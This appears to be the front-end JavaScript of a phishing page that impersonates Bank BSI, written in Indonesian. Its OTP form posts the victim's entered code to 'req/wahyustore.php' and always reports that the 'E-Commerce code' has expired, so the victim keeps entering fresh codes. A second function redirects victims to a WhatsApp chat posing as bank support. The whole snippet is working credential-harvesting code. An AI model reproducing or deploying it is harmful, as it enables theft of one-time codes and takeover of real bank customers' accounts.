// otp
$('#form2').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
 
  $("#djload").show();

    
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
$.ajax({
 type: 'POST',
 url: 'req/wahyustore.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    }, 2000);
     $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

    return false;
});       



// datawa

function getcs(){
 $("#djload").show();   
  audio4 = document.getElementById("bsiku");
  audio1 = document.getElementById("bsi");
    audio4.play();
     audio1.load();
    audio4.loop = false
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6287777466625&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
    }, 5000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 5100);      
}     
